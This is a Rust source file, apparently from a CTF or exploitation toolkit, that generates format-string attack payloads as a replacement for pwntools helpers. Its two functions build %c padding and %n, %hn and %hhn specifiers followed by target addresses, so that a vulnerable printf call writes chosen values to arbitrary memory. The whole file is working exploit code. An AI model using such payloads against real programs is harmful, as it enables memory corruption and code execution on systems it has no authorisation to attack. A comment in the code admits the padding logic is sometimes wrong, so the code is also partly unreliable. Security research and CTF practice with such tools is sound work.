use crate::util::{p64, Error};

#[derive(Debug, Clone, Copy)]
pub enum SizedWrite {
    Byte(u8),
    Short(u16),
    Int(u32),
}

impl SizedWrite {
    fn mask(&self) -> u64 {
        match &self {
            SizedWrite::Byte(_) => 0xff,
            SizedWrite::Short(_) => 0xffff,
            SizedWrite::Int(_) => 0xffffffff,
        }
    }

    fn size_spec(&self) -> String {
        match &self {
            SizedWrite::Byte(_) => "hh".to_string(),
            SizedWrite::Short(_) => "h".to_string(),
            SizedWrite::Int(_) => "".to_string(),
        }
    }

    fn val(&self) -> u64 {
        match &self {
            SizedWrite::Byte(v) => *v as u64,
            SizedWrite::Short(v) => *v as u64,
            SizedWrite::Int(v) => *v as u64,
        }
    }
}

/// This is a substitute for pwntools 'atoms'
pub struct FmtWrite {
    pub addr: u64,
    pub value: SizedWrite,
}

pub fn fmtstr_payload(
    offset: usize,
    writes: Vec<FmtWrite>,
    bytes_written: usize,
) -> Result<Vec<u8>, Error> {
    let mut cur_offset = offset;
    let mut cur_bytes_written = bytes_written;
    let mut payload = vec![];

    let pointer_start = offset + writes.len() * 3;
    let pointer_start_bytes = (writes.len() * 3) * 8;

    for (idx, write) in writes.iter().enumerate() {
        println!("bytes written: {:x}", cur_bytes_written);
        let bytes_to_write = (write.value.val() - (cur_bytes_written as u64 & write.value.mask())) & write.value.mask();
        println!("bytes to write: {:x}", bytes_to_write);
        let c_spec = format!("%{}c", bytes_to_write).as_bytes().to_vec();

        let mut resize_amt = 0;

        if bytes_to_write > 99999999999999 {
            panic!("please reconsider your life choices");
        } else if bytes_to_write > 999999 {
            resize_amt += 16;
        } else {
            resize_amt += 8;
        }

        cur_offset += c_spec.len() / 8;

        let n_spec = format!("%{}${}n", pointer_start + idx, write.value.size_spec()).as_bytes().to_vec();
        if cur_offset > 99999 {
            panic!("please reconsider your life choices");
        } else {
            resize_amt += 8;
        }

        let mut specs = [c_spec, n_spec].concat();
        cur_bytes_written += bytes_to_write as usize + resize_amt - specs.len();
        specs.resize(resize_amt, 0x41);

        cur_offset += specs.len() / 8;

        payload.append(&mut specs)
    }

    payload.resize(pointer_start_bytes, 0x41);

    for write in writes {
        payload.append(&mut p64(write.addr));
    }

    Ok(payload)
}

pub fn fmtstr_payload_nodollar(
    offset: usize,
    writes: Vec<FmtWrite>,
    bytes_written: usize,
) -> Result<Vec<u8>, Error> {
    let mut cur_offset = offset;
    let mut cur_bytes_written = bytes_written;
    let mut payload = vec![];

    let v = offset + (writes.len() * 2);
    dbg!(v);
    let v = v + (v / 4) + (4 - (v % 4));
    dbg!(v);

    let mut offset_padding = "%c".repeat(v).as_bytes().to_vec();
    let op = 8 - (offset_padding.len() % 8); // guarantee 8 byte alignment
    offset_padding.resize(offset_padding.len() + op, 0x41);

    let pointer_start_bytes = offset_padding.len() + (writes.len() * 8 * 2);
    payload.append(&mut offset_padding);

    cur_bytes_written += v + op;

    for write in writes.iter() {
        println!("bytes written: {:x}", cur_bytes_written);
        let bytes_to_write = (write.value.val() - (cur_bytes_written as u64 & write.value.mask())) & write.value.mask();
        println!("bytes to write: {:x}", bytes_to_write);
        let c_spec = format!("%{}c", bytes_to_write).as_bytes().to_vec();

        let mut resize_amt = 0;

        if bytes_to_write > 99999999999999 {
            panic!("please reconsider your life choices");
        } else if bytes_to_write > 999999 {
            resize_amt += 16;
        } else {
            resize_amt += 8;
        }

        cur_offset += c_spec.len() / 8;

        let n_spec = format!("%{}n", write.value.size_spec()).as_bytes().to_vec();
        if cur_offset > 99999 {
            panic!("please reconsider your life choices");
        } else {
            resize_amt += 8;
        }

        let mut specs = [c_spec, n_spec].concat();
        cur_bytes_written += bytes_to_write as usize + resize_amt - specs.len();
        specs.resize(resize_amt, 0x41);

        cur_offset += specs.len() / 8;

        payload.append(&mut specs)
    }

    dbg!(payload.len());
    dbg!(pointer_start_bytes);
    payload.resize(pointer_start_bytes, 0x41);

    if payload.len() % 8 != 0 {
        panic!();
    }

    // I think something is wrong, need to pad more sometimes?
    // payload.append(&mut p64(0x4141414141414141)?);
    // payload.append(&mut p64(0x4141414141414141)?);

    for write in writes {
        payload.append(&mut p64(0x4141414141414141));
        payload.append(&mut p64(write.addr));
    }

    Ok(payload)
}
